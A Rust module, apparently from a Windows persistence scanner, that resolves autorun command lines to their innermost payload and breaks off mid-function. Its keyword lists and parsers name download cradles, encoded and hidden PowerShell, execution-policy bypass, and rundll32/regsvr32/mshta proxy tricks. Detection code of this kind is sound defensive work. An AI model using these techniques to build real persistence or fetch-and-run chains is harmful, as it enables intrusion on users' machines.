//! Pure autorun command resolver (Linux-testable, no filesystem access).
//!
//! Turns the command line stored in an autostart location (Run value, task
//! `<Exec>`, service ImagePath, WMI consumer, IFEO Debugger, …) into the
//! *innermost payload* it will execute, plus the launcher chain that leads
//! there and the tradecraft flags seen on the way (hidden window, encoded
//! command, download cradle, script protocol, headless console).
//!
//! Steps (research notes `persistence.md` §3.2):
//! 1. expand `%VAR%` against a supplied profile map ([`Env`]);
//! 2. split the image the way `CreateProcess` does, including unquoted paths
//!    with spaces (`C:\Program Files\App\a.exe -x`, flagged as ambiguous);
//! 3. tokenise the arguments with `CommandLineToArgvW` rules;
//! 4. unwrap launchers recursively (depth ≤ [`MAX_DEPTH`]): cmd (`/c`, `/k`,
//!    `&`/`&&`/`|`, `start "" x`, `call`), PowerShell (`-enc` base64 UTF-16LE,
//!    `-c`, `-File`), mshta, wscript/cscript, rundll32 (incl. `javascript:`
//!    and url.dll/shell32/zipfldr/advpack proxies), regsvr32 (`/i:URL`),
//!    conhost (`--headless`), explorer, forfiles (`/c`, `0xHH` escapes),
//!    msiexec, download tools and script interpreters (python, node, AutoIt,
//!    java -jar).
//!
//! The resolver never touches the filesystem: it cannot tell which candidate
//! of an unquoted path exists, so it takes the first one ending in an
//! executable extension and reports the ambiguity.

use std::collections::HashMap;

/// Maximum launcher nesting that is unwrapped.
pub(crate) const MAX_DEPTH: usize = 4;
/// Maximum command / script length looked at (bytes).
const MAX_CMD: usize = 16 * 1024;
/// Maximum cmd.exe segments (`&`, `&&`, `|`) examined.
const MAX_SEGMENTS: usize = 8;

/// Environment used to expand `%VAR%`. Names are case-insensitive.
#[derive(Debug, Clone)]
pub(crate) struct Env {
    vars: HashMap<String, String>,
}

impl Env {
    /// Default machine variables for `system_drive` plus per-user variables
    /// for `user_profile` (e.g. `C:\Users\alice`). Without a profile the
    /// per-user variables point at `<drive>:\Users\%USERNAME%`, which still
    /// classifies as a user-writable path.
    pub fn new(system_drive: char, user_profile: Option<&str>) -> Env {
        let d = system_drive.to_ascii_uppercase();
        let profile = user_profile
            .map(|p| p.trim_end_matches('\\').to_string())
            .unwrap_or_else(|| format!(r"{d}:\Users\%USERNAME%"));
        let user = profile
            .rsplit('\\')
            .next()
            .unwrap_or("%USERNAME%")
            .to_string();
        let mut vars = HashMap::new();
        let mut set = |k: &str, v: String| {
            vars.insert(k.to_ascii_lowercase(), v);
        };
        set("SystemDrive", format!("{d}:"));
        set("SystemRoot", format!(r"{d}:\Windows"));
        set("windir", format!(r"{d}:\Windows"));
        set("ComSpec", format!(r"{d}:\Windows\system32\cmd.exe"));
        set("ProgramFiles", format!(r"{d}:\Program Files"));
        set("ProgramW6432", format!(r"{d}:\Program Files"));
        set("ProgramFiles(x86)", format!(r"{d}:\Program Files (x86)"));
        set(
            "CommonProgramFiles",
            format!(r"{d}:\Program Files\Common Files"),
        );
        set(
            "CommonProgramFiles(x86)",
            format!(r"{d}:\Program Files (x86)\Common Files"),
        );
        set("ProgramData", format!(r"{d}:\ProgramData"));
        set("ALLUSERSPROFILE", format!(r"{d}:\ProgramData"));
        set("PUBLIC", format!(r"{d}:\Users\Public"));
        set("USERPROFILE", profile.clone());
        set("HOMEDRIVE", format!("{d}:"));
        set(
            "HOMEPATH",
            profile
                .get(2..)
                .map(str::to_string)
                .unwrap_or_else(|| profile.clone()),
        );
        set("USERNAME", user);
        set("APPDATA", format!(r"{profile}\AppData\Roaming"));
        set("LOCALAPPDATA", format!(r"{profile}\AppData\Local"));
        set("TEMP", format!(r"{profile}\AppData\Local\Temp"));
        set("TMP", format!(r"{profile}\AppData\Local\Temp"));
        Env { vars }
    }

    /// Add or override one variable.
    #[allow(dead_code)]
    pub fn with_var(mut self, name: &str, value: &str) -> Env {
        self.vars
            .insert(name.to_ascii_lowercase(), value.to_string());
        self
    }

    fn system_root(&self) -> String {
        self.vars
            .get("systemroot")
            .cloned()
            .unwrap_or_else(|| r"C:\Windows".into())
    }

    /// Expand `%VAR%` (case-insensitive). Unknown variables stay literal.
    /// One pass, no recursion (values are never re-expanded).
    pub fn expand(&self, s: &str) -> String {
        let mut out = String::with_capacity(s.len());
        let mut rest = s;
        while let Some(i) = rest.find('%') {
            out.push_str(&rest[..i]);
            let after = &rest[i + 1..];
            match after.find('%') {
                Some(j) if j > 0 && j <= 64 => {
                    let name = &after[..j];
                    if let Some(v) = self.vars.get(&name.to_ascii_lowercase()) {
                        out.push_str(v);
                        rest = &after[j + 1..];
                        continue;
                    }
                    out.push('%');
                    rest = after;
                }
                _ => {
                    out.push('%');
                    rest = after;
                }
            }
        }
        out.push_str(rest);
        out
    }
}

/// Tradecraft seen while unwrapping.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct Flags {
    /// Hidden window (`-w hidden`, `Start-Process -WindowStyle Hidden`).
    pub hidden: bool,
    /// Encoded command / `FromBase64String`.
    pub encoded: bool,
    /// Download cradle (`DownloadString`, `iwr`, `irm`, curl, bitsadmin, certutil -urlcache, URLs).
    pub download: bool,
    /// `iex` / `Invoke-Expression`.
    pub iex: bool,
    /// `-ExecutionPolicy Bypass|Unrestricted`.
    pub bypass: bool,
    /// The payload is remote (http/https/ftp URL).
    pub remote: bool,
    /// `javascript:` / `vbscript:` / `mshtml,RunHTMLApplication` protocol payload.
    pub script_proto: bool,
    /// `conhost.exe --headless`.
    pub headless: bool,
    /// The outermost image is an unquoted path containing spaces (T1574.009).
    pub unquoted_spaces: bool,
}

impl Flags {
    fn merge(&mut self, o: &Flags) {
        self.hidden |= o.hidden;
        self.encoded |= o.encoded;
        self.download |= o.download;
        self.iex |= o.iex;
        self.bypass |= o.bypass;
        self.remote |= o.remote;
        self.script_proto |= o.script_proto;
        self.headless |= o.headless;
        self.unquoted_spaces |= o.unquoted_spaces;
    }

    /// Human-readable list of the set flags.
    pub fn describe(&self) -> Vec<&'static str> {
        let mut v = Vec::new();
        if self.encoded {
            v.push("encoded command");
        }
        if self.hidden {
            v.push("hidden window");
        }
        if self.download {
            v.push("download cradle");
        }
        if self.iex {
            v.push("Invoke-Expression");
        }
        if self.bypass {
            v.push("execution-policy bypass");
        }
        if self.remote {
            v.push("remote payload URL");
        }
        if self.script_proto {
            v.push("script protocol (javascript:/vbscript:)");
        }
        if self.headless {
            v.push("headless console");
        }
        v
    }
}

/// What an autorun command will run.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct Resolved {
    /// Outermost image after expansion (`C:\Windows\System32\cmd.exe`, `powershell`, …).
    pub image: String,
    /// Launchers that were unwrapped, outermost first, lower-case file names
    /// (`cmd.exe`, `powershell.exe`, …). Script files run directly add their
    /// implicit host (`a.vbs` → `wscript.exe`).
    pub chain: Vec<String>,
    /// Innermost payload: a file path (exe, dll, script) or a URL.
    pub payload: Option<String>,
    /// `payload` is a URL.
    pub payload_is_url: bool,
    /// Innermost command / script text examined (bounded).
    pub inner: String,
    /// Decoded `-EncodedCommand` text, if any (bounded).
    pub decoded: Option<String>,
    pub flags: Flags,
}

impl Resolved {
    /// The chain contains this launcher (lower-case file name).
    pub fn via(&self, name: &str) -> bool {
        self.chain.iter().any(|c| c == name)
    }

    fn push_chain(&mut self, name: &str) {
        if self.chain.last().map(String::as_str) != Some(name) && self.chain.len() < 16 {
            self.chain.push(name.to_string());
        }
    }

    fn set_payload(&mut self, p: &str, url: bool) {
        let p = p.trim().trim_matches('"').trim();
        if self.payload.is_none() && !p.is_empty() {
            self.payload = Some(p.to_string());
            self.payload_is_url = url;
            if url {
                self.flags.remote = true;
            }
        }
    }
}

/// Resolve an autorun command line.
pub(crate) fn resolve(cmd: &str, env: &Env) -> Resolved {
    let mut r = Resolved::default();
    let cmd = truncate(cmd, MAX_CMD);
    let expanded = env.expand(cmd.trim());
    unwrap(&expanded, env, 0, &mut r);
    r
}

// ---------------------------------------------------------------------------
// tokenising
// ---------------------------------------------------------------------------

fn truncate(s: &str, max: usize) -> &str {
    if s.len() <= max {
        return s;
    }
    let mut i = max;
    while !s.is_char_boundary(i) {
        i -= 1;
    }
    &s[..i]
}

/// One argument with its byte span in the source string.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Arg {
    pub text: String,
    pub start: usize,
    pub end: usize,
}

/// `CommandLineToArgvW` rules for arguments after the program name:
/// whitespace separates outside quotes; `2n` backslashes + `"` → `n`
/// backslashes and a quote toggle; `2n+1` backslashes + `"` → `n`
/// backslashes and a literal quote; `""` inside quotes → literal quote;
/// other backslashes are literal.
pub(crate) fn tokenize(s: &str) -> Vec<Arg> {
    let b = s.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < b.len() {
        while i < b.len() && (b[i] == b' ' || b[i] == b'\t' || b[i] == b'\r' || b[i] == b'\n') {
            i += 1;
        }
        if i >= b.len() {
            break;
        }
        let start = i;
        let mut cur: Vec<u8> = Vec::new();
        let mut inq = false;
        while i < b.len() {
            let c = b[i];
            if !inq && (c == b' ' || c == b'\t' || c == b'\r' || c == b'\n') {
                break;
            }
            if c == b'\\' {
                let mut n = 0;
                while i < b.len() && b[i] == b'\\' {
                    n += 1;
                    i += 1;
                }
                if i < b.len() && b[i] == b'"' {
                    cur.extend(std::iter::repeat_n(b'\\', n / 2));
                    if n % 2 == 1 {
                        cur.push(b'"');
                        i += 1;
                    }
                    // even: the quote is handled by the next iteration
                } else {
                    cur.extend(std::iter::repeat_n(b'\\', n));
                }
                continue;
            }
            if c == b'"' {
                if inq && i + 1 < b.len() && b[i + 1] == b'"' {
                    cur.push(b'"');
                    i += 2;
                    continue;
                }
                inq = !inq;
                i += 1;
                continue;
            }
            cur.push(c);
            i += 1;
        }
        out.push(Arg {
            text: String::from_utf8_lossy(&cur).into_owned(),
            start,
            end: i,
        });
    }
    out
}

/// Executable extensions `CreateProcess` / `ShellExecute` resolve.
const EXEC_EXTS: &[&str] = &[
    ".exe", ".com", ".bat", ".cmd", ".scr", ".pif", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".hta",
    ".ps1", ".lnk", ".msi", ".cpl", ".dll", ".ocx", ".sys",
];

fn has_ext(name_lower: &str) -> bool {
    let file = name_lower.rsplit('\\').next().unwrap_or(name_lower);
    file.contains('.')
}

/// Split the program name from its arguments.
/// Returns `(image, rest, unquoted_path_with_spaces)`.
pub(crate) fn split_image(cmd: &str) -> (String, &str, bool) {
    let cmd = cmd.trim_start();
    if let Some(after) = cmd.strip_prefix('"') {
        return match after.find('"') {
            Some(j) => (after[..j].to_string(), &after[j + 1..], false),
            None => (after.to_string(), "", false),
        };
    }
    let first_end = cmd
        .find(|c: char| c.is_ascii_whitespace())
        .unwrap_or(cmd.len());
    let first = &cmd[..first_end];
    let first_l = first.to_ascii_lowercase();
    if first_l.contains('\\') && !has_ext(&first_l) {
        // Unquoted path with spaces: CreateProcess tries `C:\Program.exe`,
        // `C:\Program Files\App\a.exe`, … — take the first candidate that
        // ends in an executable extension at a word boundary.
        let lower = cmd.to_ascii_lowercase();
        let mut best: Option<usize> = None;
        for ext in EXEC_EXTS {
            let mut from = 0;
            while let Some(k) = lower[from..].find(ext) {
                let end = from + k + ext.len();
                let boundary = end == lower.len()
                    || lower[end..].starts_with(|c: char| c.is_ascii_whitespace());
                if boundary {
                    best = Some(best.map_or(end, |b: usize| b.min(end)));
                    break;
                }
                from = end;
            }
        }
        if let Some(end) = best {
            let img = &cmd[..end];
            let spaces = img.contains(|c: char| c.is_ascii_whitespace());
            return (img.to_string(), &cmd[end..], spaces);
        }
    }
    (first.to_string(), &cmd[first_end..], false)
}

/// Normalise kernel / relative image forms used by services and drivers.
fn normalize_image(img: &str, env: &Env) -> String {
    let t = img.trim();
    let t = t
        .strip_prefix(r"\??\")
        .or_else(|| t.strip_prefix(r"\\?\"))
        .unwrap_or(t);
    let l = t.to_ascii_lowercase();
    if let Some(rest) = l.strip_prefix(r"\systemroot\") {
        let off = t.len() - rest.len();
        return format!(r"{}\{}", env.system_root(), &t[off..]);
    }
    if l.starts_with(r"system32\") || l.starts_with(r"syswow64\") {
        return format!(r"{}\{}", env.system_root(), t);
    }
    t.to_string()
}

/// Lower-case launcher name with `.exe` added when the image has no extension.
fn launcher_name(image: &str) -> String {
    let f = kestrel_common::file_name_lower(image);
    if f.contains('.') {
        f
    } else {
        format!("{f}.exe")
    }
}

pub(crate) fn is_url(s: &str) -> bool {
    let l = s.trim().trim_matches('"').to_ascii_lowercase();
    l.starts_with("http://") || l.starts_with("https://") || l.starts_with("ftp://")
}

/// First http(s) URL inside a text.
fn find_url(text: &str) -> Option<String> {
    let l = text.to_ascii_lowercase();
    let i = match (l.find("http://"), l.find("https://")) {
        (Some(a), Some(b)) => a.min(b),
        (Some(a), None) | (None, Some(a)) => a,
        _ => return None,
    };
    let end = text[i..]
        .find(|c: char| c.is_whitespace() || "\"'`)(;|<>,".contains(c))
        .map(|e| i + e)
        .unwrap_or(text.len());
    Some(text[i..end].to_string())
}

// ---------------------------------------------------------------------------
// unwrapping
// ---------------------------------------------------------------------------

fn unwrap(cmd: &str, env: &Env, depth: usize, r: &mut Resolved) {
    let cmd = cmd.trim().trim_start_matches('@').trim();
    if cmd.is_empty() {
        return;
    }
    r.inner = truncate(cmd, 4096).to_string();
    if depth > MAX_DEPTH {
        return;
    }
    let (img_raw, rest, unquoted) = split_image(cmd);
    let img = normalize_image(&env.expand(&img_raw), env);
    if depth == 0 {
        r.image = img.clone();
        r.flags.unquoted_spaces |= unquoted;
    }
    if is_url(&img) {
        r.set_payload(&img, true);
        return;
    }
    let name = launcher_name(&img);
    match name.as_str() {
        "cmd.exe" => {
            r.push_chain(&name);
            if !unwrap_cmd(rest, env, depth, r) {
                // a bare shell (`cmd.exe` as an IFEO debugger) is the payload
                r.set_payload(&img, false);
            }
        }
        "powershell.exe" | "pwsh.exe" | "powershell_ise.exe" => {
            r.push_chain("powershell.exe");
            if rest.trim().is_empty() {
                r.set_payload(&img, false);
            }
            unwrap_powershell(rest, env, depth, r);
        }
        "mshta.exe" => {
            r.push_chain(&name);
            unwrap_mshta(rest, env, depth, r);
        }
        "wscript.exe" | "cscript.exe" => {
            r.push_chain(&name);
            let toks = tokenize(rest);
            if let Some(t) = toks.iter().find(|t| !t.text.starts_with("//")) {
                let p = env.expand(&t.text);
                r.set_payload(&p, is_url(&p));
            }
        }
        "rundll32.exe" => {
            r.push_chain(&name);
            unwrap_rundll32(rest, env, depth, r);
        }
        "regsvr32.exe" => {
            r.push_chain(&name);
            unwrap_regsvr32(rest, env, r);
        }
        "conhost.exe" => {
            r.push_chain(&name);
            unwrap_conhost(rest, env, depth, r);
        }
        "explorer.exe" => {
            let toks = tokenize(rest);
            match toks.iter().find(|t| !t.text.starts_with('/')) {
                Some(t) => {
                    r.push_chain(&name);
                    unwrap(&rest[t.start..], env, depth + 1, r);
                }
                None => r.set_payload(&img, false),
            }
        }
        "forfiles.exe" => {
            r.push_chain(&name);
            let toks = tokenize(rest);
            if let Some(i) = toks.iter().position(|t| t.text.eq_ignore_ascii_case("/c")) {
                if let Some(v) = toks.get(i + 1) {
                    unwrap(&forfiles_unescape(&v.text), env, depth + 1, r);
                }
            }
        }
        "msiexec.exe" => {
            r.push_chain(&name);
            let toks = tokenize(rest);
            for (i, t) in toks.iter().enumerate() {
                let l = t.text.to_ascii_lowercase();
                if matches!(l.as_str(), "/i" | "-i" | "/package" | "/a" | "/j" | "/f") {
                    if let Some(v) = toks.get(i + 1) {
                        let url = is_url(&v.text);
                        if url {
                            r.flags.download = true;
                        }
                        r.set_payload(&env.expand(&v.text), url);
                    }
                    break;
                }
            }
        }
        "curl.exe" | "wget.exe" | "bitsadmin.exe" | "certutil.exe" => {
            r.push_chain(&name);
            let l = rest.to_ascii_lowercase();
            if name != "certutil.exe" || l.contains("urlcache") || l.contains("verifyctl") {
                r.flags.download = true;
            }
            if let Some(u) = find_url(rest) {
                r.flags.download = true;
                r.set_payload(&u, true);
            }
        }
        "python.exe" | "pythonw.exe" | "python3.exe" | "py.exe" | "pyw.exe" | "node.exe"
        | "autoit3.exe" | "autoit3_x64.exe" | "java.exe" | "javaw.exe" => {
            r.push_chain(&name);
            let toks = tokenize(rest);
            let mut it = toks.iter().peekable();
            while let Some(t) = it.next() {
                let l = t.text.to_ascii_lowercase();
                if l == "-c" || l == "-e" || l == "--eval" {
                    // inline code
                    if let Some(code) = it.next() {
                        analyze_script(&code.text, env, depth, r);
                    }
                    break;
                }
                if l == "-jar" {
                    if let Some(j) = it.next() {
                        r.set_payload(&env.expand(&j.text), false);
                    }
                    break;
                }
                if l == "-m" || l.starts_with('-') || l.starts_with('/') {
                    if l == "-m" {
                        break;
                    }
                    continue;
                }
                let p = env.expand(&t.text);
                r.set_payload(&p, is_url(&p));
                break;
            }
        }
        _ => {
            // A plain program or a script file run through its association.
            let host = match name.rsplit('.').next().unwrap_or("") {
                "vbs" | "vbe" | "js" | "jse" | "wsf" | "wsh" => Some("wscript.exe"),
                "hta" => Some("mshta.exe"),
                "bat" | "cmd" => Some("cmd.exe"),
                "ps1" => Some("powershell.exe"),
                _ => None,
            };
            if let Some(h) = host {
                r.push_chain(h);
            }
            r.set_payload(&img, false);
        }
    }
}

/// cmd.exe built-ins and harmless helpers that are never the payload.
const CMD_BUILTINS: &[&str] = &[
    "echo", "del", "erase", "rd", "rmdir", "cd", "chdir", "set", "setlocal", "endlocal", "timeout",
    "ping", "copy", "move", "mkdir", "md", "exit", "if", "for", "type", "ren", "rename", "attrib",
    "reg", "taskkill", "choice", "whoami", "cls", "title", "pushd", "popd", "goto", "rem", "ver",
    "vol", "pause", "shift", "color", "prompt", "path", "dir", "mklink", "assoc", "ftype", "break",
    "chcp", "date", "time", "tasklist", "find", "findstr", "more", "sort", "nul", ">nul",
];

/// Returns false when there is no `/c` / `/k` command to unwrap.
fn unwrap_cmd(rest: &str, env: &Env, depth: usize, r: &mut Resolved) -> bool {
    let toks = tokenize(rest);
    let Some(sw) = toks.iter().position(|t| {
        let l = t.text.to_ascii_lowercase();
        l == "/c" || l == "/k" || l == "/r" || (l.starts_with('/') && l.ends_with("/c"))
    }) else {
        return false;
    };
    let mut inner = rest[toks[sw].end..].trim();
    // cmd /? : with more than two quotes, the first and last are stripped.
    if inner.len() >= 2
        && inner.starts_with('"')
        && inner.ends_with('"')
        && inner.matches('"').count() > 2
    {
        inner = &inner[1..inner.len() - 1];
    }
    for seg in split_cmd_segments(inner).into_iter().take(MAX_SEGMENTS) {
        unwrap_cmd_segment(seg, env, depth, r);
    }
    true
}

fn unwrap_cmd_segment(seg: &str, env: &Env, depth: usize, r: &mut Resolved) {
    let seg = seg.trim().trim_start_matches('@').trim();
    if seg.is_empty() {
        return;
    }
    let toks = tokenize(seg);
    let Some(first) = toks.first() else {
        return;
    };
    let w = first.text.to_ascii_lowercase();
    if w == "start" {
        let mut i = 1;
        // the first quoted argument of `start` is the window title
        if let Some(t) = toks.get(1) {
            if seg[t.start..].starts_with('"') {
                i = 2;
            }
        }
        while let Some(t) = toks.get(i) {
            let l = t.text.to_ascii_lowercase();
            if l.starts_with('/') {
                if l == "/d" {
                    i += 1;
                }
                if l == "/min" {
                    r.flags.hidden = true;
                }
                i += 1;
            } else {
                break;
            }
        }
        if let Some(t) = toks.get(i) {
            unwrap(&seg[t.start..], env, depth + 1, r);
        }
        return;
    }
    if w == "call" {
        if let Some(t) = toks.get(1) {
            unwrap(&seg[t.start..], env, depth + 1, r);
        }
        return;
    }
    if CMD_BUILTINS.contains(&w.as_str()) || w.starts_with('>') || w.starts_with('<') {
        // `reg add …Run… /d "…"` and `copy` drop helpers are not the payload,
        // but a URL anywhere still marks a download.
        return;
    }
    // `ping.exe` / `timeout.exe` spelled with the extension
    let wf = launcher_name(&w);
    if CMD_BUILTINS.contains(&wf.trim_end_matches(".exe")) && wf.ends_with(".exe") {
        return;
    }
    unwrap(seg, env, depth + 1, r);
}

/// Split on `&`, `&&`, `|`, `||` outside quotes (`^` escapes the next char).
fn split_cmd_segments(s: &str) -> Vec<&str> {
    let b = s.as_bytes();
    let mut out = Vec::new();
    let mut inq = false;
    let mut start = 0;
    let mut i = 0;
    while i < b.len() {
        match b[i] {
            b'^' if !inq => {
                i += 2;
                continue;
            }
            b'"' => inq = !inq,
            b'&' | b'|' if !inq => {
                out.push(&s[start..i]);
                let mut j = i + 1;
                if j < b.len() && (b[j] == b'&' || b[j] == b'|') {
                    j += 1;
                }
                start = j;
                i = j;
                continue;
            }
            _ => {}
        }
        i += 1;
    }
    if start <= s.len() {
        out.push(&s[start..]);
    }
    out
}

/// PowerShell parameter abbreviations: `-e`/`-ec`/`-enc…` encoded command,
/// `-c…` command, `-f…` file, `-w…` window style, `-ep`/`-ex…` execution policy.
fn unwrap_powershell(rest: &str, env: &Env, depth: usize, r: &mut Resolved) {
    let toks = tokenize(rest);
    let mut i = 0;
    while i < toks.len() {
        let t = &toks[i];
        let raw = t.text.as_str();
        let is_param = raw.starts_with('-')
            || raw.starts_with('/')
            || raw.starts_with('\u{2013}')
            || raw.starts_with('\u{2014}');
        if !is_param {
            // positional: a .ps1 file, else the command text
            let l = raw.to_ascii_lowercase();
            if l.ends_with(".ps1") {
                r.set_payload(&env.expand(raw), is_url(raw));
            } else {
                analyze_script(rest[t.start..].trim(), env, depth, r);
            }
            return;
        }
        let p = raw
            .trim_start_matches(['-', '/', '\u{2013}', '\u{2014}'])
            .to_ascii_lowercase();
        let value = toks.get(i + 1).map(|v| v.text.as_str());
        if p.is_empty() {
            return; // `-` = read from stdin
        }
        if p == "e" || p == "ec" || (p.len() >= 3 && "encodedcommand".starts_with(&p)) {
            r.flags.encoded = true;
            if let Some(v) = value {
                if let Some(text) = decode_ps_base64(v) {
                    let text = truncate(&text, MAX_CMD).to_string();
                    r.decoded = Some(truncate(&text, 4096).to_string());
                    analyze_script(&text, env, depth, r);
                }
            }
            return;
        }
        if p == "ep" || (p.len() >= 2 && "executionpolicy".starts_with(&p)) {
            if let Some(v) = value {
                let v = v.to_ascii_lowercase();
                if v.starts_with("bypass") || v.starts_with("unrestricted") {
                    r.flags.bypass = true;
                }
            }
            i += 2;
            continue;
        }
        if p.starts_with('w') && "windowstyle".starts_with(&p) {
            if let Some(v) = value {
                let v = v.trim_matches(['"', '\'']).to_ascii_lowercase();
                if v.starts_with('h') || v == "1" {
                    r.flags.hidden = true;
                }
            }
            i += 2;
            continue;
        }
        if p.starts_with('f') && "file".starts_with(&p) {
            if let Some(v) = value {
                r.set_payload(&env.expand(v), is_url(v));
            }
            return;
        }
        if p.starts_with('c') && "command".starts_with(&p) {
            if let Some(v) = toks.get(i + 1) {
                analyze_script(rest[v.start..].trim(), env, depth, r);
            }
            return;
        }
        if p.starts_with("no") || p == "sta" || p == "mta" || p == "nol" {
            i += 1;
            continue;
        }
        // parameters that take a value
        if [
            "version",
            "inputformat",
            "outputformat",
            "configurationname",
            "psconsolefile",
            "settingsfile",
            "workingdirectory",
            "wd",
            "executiontimeout",
            "encodedarguments",
            "ea",
            "if",
            "of",
            "v",
        ]
        .iter()
        .any(|k| *k == p || (p.len() >= 2 && k.starts_with(p.as_str())))
        {
            i += 2;
            continue;
        }
        i += 1;
    }
}

/// Look at script / command text: flags, nested launcher, payload.
fn analyze_script(text: &str, env: &Env, depth: usize, r: &mut Resolved) {
    let mut t = text.trim();
    // strip one level of wrapping quotes / `& { … }`
    if t.len() >= 2
        && ((t.starts_with('"') && t.ends_with('"')) || (t.starts_with('\'') && t.ends_with('\'')))
    {
        t = &t[1..t.len() - 1];
    }
    let t = t.trim().trim_start_matches('&').trim();
    let t = t
        .strip_prefix('{')
        .and_then(|x| x.strip_suffix('}'))
        .unwrap_or(t)
        .trim();
    r.inner = truncate(t, 4096).to_string();
    let l = t.to_ascii_lowercase();
    let flags = script_flags(&l);
    r.flags.merge(&flags);
    // A nested launcher command (`powershell -c "mshta http://…"`).
    let first = l
        .split(|c: char| c.is_whitespace() || c == '(' || c == ';')
        .next()
        .unwrap_or("");
    let first = first.trim_matches(['"', '\'']);
    let fname = launcher_name(first);
    if is_launcher(&fname) && depth < MAX_DEPTH {
        unwrap(t, env, depth + 1, r);
        return;
    }
    // Start-Process / & "C:\path\x.exe" style: first quoted path with an executable extension.
    if let Some(p) = quoted_exec_path(t) {
        r.set_payload(&env.expand(&p), false);
    }
    if let Some(u) = find_url(t) {
        r.set_payload(&u, true);
    }
}

fn is_launcher(name: &str) -> bool {
    matches!(
        name,
        "cmd.exe"
            | "powershell.exe"
            | "pwsh.exe"
            | "mshta.exe"
            | "wscript.exe"
            | "cscript.exe"
            | "rundll32.exe"
            | "regsvr32.exe"
            | "conhost.exe"
            | "forfiles.exe"
            | "msiexec.exe"
            | "curl.exe"
            | "bitsadmin.exe"
            | "certutil.exe"
    )
}

/// Tradecraft keywords in (lower-case) script text.
fn script_flags(l: &str) -> Flags {
    let mut f = Flags::default();
    const DL: &[&str] = &[
        "downloadstring",
        "downloadfile",
        "downloaddata",
        "invoke-webrequest",
        "invoke-restmethod",
        "net.webclient",
        "start-bitstransfer",
        "xmlhttp",
        "winhttprequest",
        "http://",
        "https://",
    ];
    if DL.iter().any(|k| l.contains(k)) || has_word(l, "iwr") || has_word(l, "irm") {
        f.download = true;
    }
    if has_word(l, "iex") || l.contains("invoke-expression") {
        f.iex = true;
    }
    if l.contains("frombase64string") || crate::util::has_encoded_command(l) {
        f.encoded = true;
    }
    if crate::util::has_hidden_window(l) || l.contains("windowstyle hidden") {
        f.hidden = true;
    }
    if l.contains("javascript:") || l.contains("vbscript:") || l.contains("runhtmlapplication") {
        f.script_proto = true;
    }
    f
}

/// `w` as a whole word (not part of an identifier).
fn has_word(hay: &str, w: &str) -> bool {
    let b = hay.as_bytes();
    let mut from = 0;
    while let Some(i) = hay[from..].find(w) {
        let s = from + i;
        let e = s + w.len();
        let ok_l =
            s == 0 || !(b[s - 1].is_ascii_alphanumeric() || b[s - 1] == b'_' || b[s - 1] == b'-');
        let ok_r = e >= b.len() || !(b[e].is_ascii_alphanumeric() || b[e] == b'_' || b[e] == b'-');
        if ok_l && ok_r {
            return true;
        }
        from = e;
    }
    false
}

/// First quoted (`"…"` or `'…'`) absolute path with an executable/script extension.
fn quoted_exec_path(t: &str) -> Option<String> {
    for q in ['"', '\''] {
        let mut parts = t.split(q);
        parts.next();
        for (i, p) in parts.enumerate() {
            if i % 2 == 1 {
                continue;
            }
            let l = p.to_ascii_lowercase();
            let abs = (l.len() > 2 && l.as_bytes()[1] == b':')
                || l.starts_with('%')
                || l.starts_with(r"\\")
                || l.starts_with("$env:");
            if abs
                && [
                    ".exe", ".dll", ".ps1", ".vbs", ".js", ".hta", ".bat", ".cmd", ".scr",
                ]
                .iter()
                .any(|e| l.ends_with(e))
            {
                return Some(p.to_string());
            }
        }
    }
    None
}

fn unwrap_mshta(rest: &str, env: &Env, depth: usize, r: &mut Resolved) {
    let t = rest.trim();
    let l = t.to_ascii_lowercase();
    let unq = l.trim_start_matches(['"', '\'']);
    if unq.starts_with("vbscript:") || unq.starts_with("javascript:") || unq.starts_with("about:") {
        r.flags.script_proto = true;
        let f = script_flags(&l);
        r.flags.merge(&f);
        // a launcher hidden inside the script (`…Run "powershell -enc …"`)
        if let Some(i) = l.find("powershell") {
            unwrap(&t[i..], env, depth + 1, r);
        }
        if let Some(u) = find_url(t) {
            r.set_payload(&u, true);
        }
        return;
    }
    let toks = tokenize(rest);
    if let Some(a) = toks.first() {
        let p = env.expand(&a.text);
        r.set_payload(&p, is_url(&p));
    }
}

fn unwrap_rundll32(rest: &str, env: &Env, depth: usize, r: &mut Resolved) {
    let l = rest.to_ascii_lowercase();
    if l.contains("javascript:") || l.contains("vbscript:") || l.contains("runhtmlapplication") {
        r.flags.script_proto = true;
        r.flags.merge(&script_flags(&l));
        if let Some(i) = l.find("powershell") {
            unwrap(&rest[i..], env, depth + 1, r);
        }
        if let Some(u) = find_url(rest) {
            r.set_payload(&u, true);
        }
        return;
    }
    let toks = tokenize(rest);
    let Some(first) = toks.first() else {
        return;
    };
    // `C:\x\a.dll,Entry` / `a.dll #1` / `"C:\a b\x.dll",Entry`
    let (dll, mut entry) = match first.text.find(',') {
        Some(i) => (
            first.text[..i].to_string(),
            first.text[i + 1..].trim().to_string(),
        ),
        None => (first.text.clone(), String::new()),
    };
    let mut next = 1;
    if entry.is_empty() {
        if let Some(t) = toks.get(1) {
            if let Some(e) = t.text.strip_prefix(',') {
                entry = e.to_string();
                next = 2;
            }
        }
    }
    let dll_l = kestrel_common::file_name_lower(&dll);
    let entry_l = entry.to_ascii_lowercase();
    let proxy = matches!(
        (dll_l.trim_end_matches(".dll"), entry_l.as_str()),
        ("url", "fileprotocolhandler" | "openurl" | "openurla")
            | ("ieframe", "openurl")
            | ("shdocvw", "openurl")
            | ("shell32", "shellexec_rundll" | "shellexec_rundlla")
            | ("zipfldr", "routethecall")
            | ("advpack" | "ieadvpack", "registerocx")
            | ("pcwutl", "launchapplication")
    );
    if proxy {
        if let Some(t) = toks.get(next) {
            let inner = &rest[t.start..];
            if is_url(&t.text) {
                r.set_payload(&t.text, true);
            } else {
                unwrap(inner, env, depth + 1, r);
            }
            return;
        }
    }
    let dll = env.expand(&dll);
    r.set_payload(&dll, is_url(&dll));
}

fn unwrap_regsvr32(rest: &str, env: &Env, r: &mut Resolved) {
    let toks = tokenize(rest);
    let mut dll: Option<String> = None;
    for t in &toks {
        let l = t.text.to_ascii_lowercase();
        if let Some(v) = l.strip_prefix("/i:").or_else(|| l.strip_prefix("-i:")) {
            let orig = &t.text[t.text.len() - v.len()..];
            let orig = orig.trim_matches('"');
            if is_url(orig) {
                r.flags.download = true;
                r.set_payload(orig, true);
            } else if !orig.is_empty() {
                r.set_payload(&env.expand(orig), false);
